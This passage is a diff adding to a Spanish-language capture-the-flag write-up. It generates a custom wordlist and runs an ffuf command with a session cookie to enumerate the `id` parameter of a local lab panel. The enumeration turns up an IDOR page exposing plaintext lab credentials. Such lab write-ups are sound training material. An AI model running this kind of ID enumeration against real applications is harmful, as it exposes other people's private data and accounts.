@@ -164,3 +164,105 @@ http://172.17.0.2/bills/panel.php?id=xya456
 ---
 
 A partir de este punto, se procedió a analizar y fuzzear el parámetro `id` en busca de posibles vulnerabilidades.
+
+## 🧪 Generación de wordlist personalizada
+
+Dado que el parámetro `id` seguía un patrón específico (por ejemplo: `xya456`), se optó por generar una **wordlist personalizada** con posibles combinaciones para realizar fuzzing.
+
+Para ello, se creó un diccionario basado en:
+
+* Prefijo fijo: `xy`
+* Variación de caracteres (letras)
+* Rango numérico (0–1000)
+
+Ejemplo de valores generados:
+
+```id="p9d3ka"
+xya0
+xya1
+xya2
+...
+xyb0
+xyb1
+...
+xyz1000
+```
+
+Este enfoque permitió adaptar el fuzzing al comportamiento observado en la aplicación, incrementando las probabilidades de encontrar identificadores válidos.
+
+### 🧠 Análisis
+
+* 🔎 La creación de wordlists específicas es más efectiva que el uso de listas genéricas.
+* 🧪 Permite atacar directamente patrones identificados durante la enumeración.
+* ⚡ Mejora significativamente la eficiencia del fuzzing.
+
+---
+
+Posteriormente, esta wordlist fue utilizada para realizar pruebas sobre el parámetro `id`.
+
+## 🚀 Fuzzing del parámetro `id`
+
+Una vez generada la wordlist personalizada, se procedió a realizar fuzzing sobre el parámetro `id` utilizando la herramienta **ffuf**.
+
+```bash id="v3m8zk"
+ffuf -u 'http://172.17.0.2/bills/panel.php?id=FUZZ' \
+-w fuzz.txt \
+-H "Cookie: PHPSESSID=42k3613g85ibvdee298cm8vea3" \
+-ac -c
+```
+
+### 📊 Resultados
+
+Durante el fuzzing se identificaron múltiples valores válidos del parámetro `id`, entre ellos:
+
+<img width="1320" height="631" alt="imagen" src="https://github.com/user-attachments/assets/86627511-8cb6-4eaa-9ad7-1718de731e97" />
+
+```id="idsvalidos"
+xya123
+xya456
+xya789
+xyb234
+xyb567
+xyb890
+xyc123
+xyc456
+xyc724
+xyd234
+xyd567
+xyd890
+xye123
+xye456
+xye789
+xyf234
+xyf567
+xyf890
+xyg123
+xyg456
+xyu597
+```
+
+### 🧠 Análisis
+
+* 🔎 Todos los valores válidos retornaban código **200 OK**, por lo que fue necesario identificar diferencias en el contenido.
+* ⚠️ Se observó que la mayoría de respuestas tenían el mismo tamaño (**6163 bytes**), excepto un caso particular.
+
+### ⭐ Hallazgo relevante
+
+El ID más interesante fue:
+
+```id="hallazgo"
+xyc724
+```
+
+Este valor devolvía una respuesta con un tamaño distinto (**5994 bytes**), lo que indicaba contenido diferente.
+
+Al acceder a dicho recurso, se encontraron credenciales en texto plano:
+
+```id="credenciales"
+Usuario: duque
+Password: duquelaje81029557!
+```
+
+---
+
+Este hallazgo confirma la existencia de una vulnerabilidad de tipo **IDOR (Insecure Direct Object Reference)**, ya que fue posible acceder a información sensible manipulando directamente el parámetro `id`.
